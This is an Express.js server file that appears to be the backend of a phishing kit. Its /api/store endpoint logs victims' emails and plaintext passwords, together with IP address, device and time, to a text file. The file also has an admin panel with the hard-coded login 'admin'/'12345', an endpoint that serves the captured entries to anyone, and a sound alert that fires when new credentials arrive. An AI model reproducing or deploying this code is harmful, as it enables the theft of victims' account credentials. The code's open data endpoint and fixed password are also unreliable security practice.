// server/server.js
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");
const useragent = require("useragent");
const path = require("path");

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

// 🟨 Store Email + Password in data.txt
app.post("/api/store", (req, res) => {
  const { email, password } = req.body;
  const agent = useragent.parse(req.headers["user-agent"]);
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString();

  const device = agent.device.toString().toLowerCase().includes("mobile")
    ? "Mobile"
    : "Desktop";

  const entry = `Email: ${email} | Password: ${password} | Device: ${device} | UserAgent: ${agent.toString()} | IP: ${ip} | Time: ${timestamp}\n`;

  fs.appendFile("data.txt", entry, (err) => {
    if (err) {
      console.error("Error saving data:", err);
      res.status(500).send("Failed to save");
    } else {
      console.log("Saved:", entry);
      res.send("Saved");
    }
  });
});

// Store all visits
let totalClicks = 0;
let lastDataLength = 0;
let alertActive = false;

// 🔐 Admin login check
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === "admin" && password === "12345") {
    res.send({ success: true });
  } else {
    res.send({ success: false });
  }
});

// 🟨 Return data.txt contents
app.get("/api/data", (req, res) => {
  fs.readFile("data.txt", "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    const lines = data.trim().split("\n").map((line, i) => ({
      id: i,
      content: line,
    }));
    res.json(lines);
  });
});

// 🟥 Delete a line from data.txt
app.delete("/api/data/:id", (req, res) => {
  const id = parseInt(req.params.id);
  fs.readFile("data.txt", "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    let lines = data.trim().split("\n");
    lines.splice(id, 1);
    fs.writeFile("data.txt", lines.join("\n") + "\n", (err) => {
      if (err) return res.status(500).send("Error writing file");
      res.send("Deleted");
    });
  });
});

// 🟢 Count total clicks
app.post("/api/click", (req, res) => {
  totalClicks++;
  const agent = useragent.parse(req.headers["user-agent"]);
  const device = agent.device.toString().toLowerCase().includes("mobile")
    ? "Mobile"
    : "Desktop";

  res.send({
    count: totalClicks,
    device,
  });
});

// 🔊 Check if there's new data (for sound alert)
app.get("/api/check-alert", (req, res) => {
  fs.readFile("data.txt", "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    const lines = data.trim().split("\n").length;
    const newData = lines > lastDataLength;
    if (newData) {
      alertActive = true;
      lastDataLength = lines;
    }
    res.json({ alert: alertActive });
  });
});

// 🛑 Stop the alert sound
app.post("/api/stop-alert", (req, res) => {
  alertActive = false;
  res.send("Stopped");
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
